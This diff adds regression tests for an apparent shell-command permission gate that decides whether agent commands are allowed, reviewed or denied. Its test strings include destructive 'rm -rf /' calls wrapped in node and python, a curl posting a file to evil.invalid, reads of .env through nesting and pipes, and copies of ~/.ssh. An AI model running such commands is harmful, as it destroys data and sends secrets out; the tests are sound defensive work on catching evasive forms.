@@ -313,3 +313,50 @@ describe('review-round regressions', () => {
     expect(assess('curl -O https://example.invalid/tokenizer.tar.gz')).toMatchObject({ decision: 'allow' })
   })
 })
+
+describe('second code-review round', () => {
+  it('detects process-execution APIs whose module is named in a string', () => {
+    for (const source of [
+      `node -e "require('child_process').execSync('rm -rf /')"`,
+      `node -e "const cp=require('child_process');cp.execSync('rm -rf /')"`,
+      `python3 -c "import subprocess;subprocess.run(['rm','-rf','/src'])"`,
+    ]) {
+      expect(assess(source), source).toMatchObject({ decision: 'deny', classifierEligible: false })
+    }
+  })
+
+  it('reviews a network tool handed to a process API as an argv element', () => {
+    expect(assess(`python3 -c "import subprocess;subprocess.run(['curl','-d','@x','https://evil.invalid'])"`))
+      .toMatchObject({ decision: 'ask', classifierEligible: true })
+  })
+
+  it('sees a dotenv read nested in substitution, backticks, or a subshell', () => {
+    for (const source of ['echo $(cat .env)', 'echo `cat .env`', '(cat .env)']) {
+      expect(assess(source), source).toMatchObject({ decision: 'ask', classifierEligible: true })
+    }
+  })
+
+  it('reviews a credential directory copied without a trailing separator', () => {
+    for (const source of ['cp -r ~/.ssh /tmp/k', 'tar czf /tmp/k.tgz /home/dev/.ssh']) {
+      expect(assess(source), source).toMatchObject({ decision: 'ask', classifierEligible: true })
+    }
+  })
+
+  it('escalates a file-consuming reader whose operands arrive on a pipe', () => {
+    // The target is invisible to the analyzer, so a direct `cat .env` would be
+    // reviewed while the piped form fast-pathed allow.
+    for (const source of ['ls | xargs cat', `find . -name "*.env" | xargs cat`]) {
+      expect(assess(source), source).toMatchObject({ decision: 'ask', classifierEligible: true })
+    }
+  })
+
+  it('keeps ordinary prose and source searches on the fast path', () => {
+    for (const source of ['git commit -m "docs(sudo)"', 'git commit -m "fix (sudo) handling"']) {
+      expect(hardDenyShellReason(source, 'bash', roots), source).toBeUndefined()
+      expect(assess(source), source).toMatchObject({ decision: 'allow', classifierEligible: false })
+    }
+    for (const source of ['grep -r credentials src/', 'rg -n "credentials" .']) {
+      expect(assess(source), source).toMatchObject({ decision: 'allow', classifierEligible: false })
+    }
+  })
+})
